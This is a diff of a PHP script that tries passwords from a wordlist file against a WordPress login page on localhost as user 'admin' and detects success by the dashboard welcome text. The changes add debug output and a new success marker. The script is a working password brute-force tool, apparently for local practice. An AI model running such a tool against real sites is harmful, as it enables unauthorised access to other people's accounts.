@@ -2,7 +2,7 @@
 require 'get_web_page.php';
 
 $username = "admin";
-$password = "password";
+$password = "passwordholder";
 
 $url = 'http://localhost:8888/wp-login.php';
 
@@ -15,6 +15,7 @@ while(!feof($fileHere)){
     echo "New one                           \n";
     echo "----------------------------------\n";
     $password = fgets($fileHere);
+    echo "The username we are trying is " .$username . " \n";
     echo "The current password we are trying is ... " . $password;
     echo "\n";
     $resultFromCurl = get_web_page( $url, $username, $password);
@@ -34,9 +35,12 @@ while(!feof($fileHere)){
     }
 
     */
-    $needle = "Welcome to WordPress";
-    $needle = "This is your first post.";
+    $needle = "Welcome to your WordPress Dashboard!";
+    //$needle = "This is your first post.";
     $checker = strpos($resultFromCurl['content'], $needle);
+    echo "checker var is $checker \n";
+    echo "The print of resultFromCurl is ";
+    print_r($resultFromCurl);
     //$checker = true;
 
     if($checker){
